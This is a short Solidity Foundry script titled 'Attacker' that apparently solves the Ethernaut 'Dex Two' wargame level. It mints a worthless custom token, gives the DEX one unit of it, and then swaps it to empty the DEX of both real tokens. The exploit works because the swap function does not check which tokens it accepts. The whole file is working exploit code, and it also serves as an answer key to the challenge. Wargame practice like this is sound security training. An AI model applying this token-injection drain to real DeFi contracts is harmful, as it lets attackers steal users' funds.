// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {DexTwo, SwappableTokenTwo} from "../instances/Ilevel23.sol";

contract Attacker is Script {
    DexTwo level23 = DexTwo(0x43511B64F6ABe0cb0716B697d87aAEB08ee8C588);
    address token1 = level23.token1();
    address token2 = level23.token2();

    address player = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function run() external {
        vm.startBroadcast();

        SwappableTokenTwo token3 = new SwappableTokenTwo(address(level23), "Token3", "T3", 4);

        token3.approve(player, address(level23), 4);
        token3.transfer(address(level23), 1);

        level23.swap(address(token3), token1, 1);
        level23.swap(address(token3), token2, 2);

        vm.stopBroadcast();
    }
}
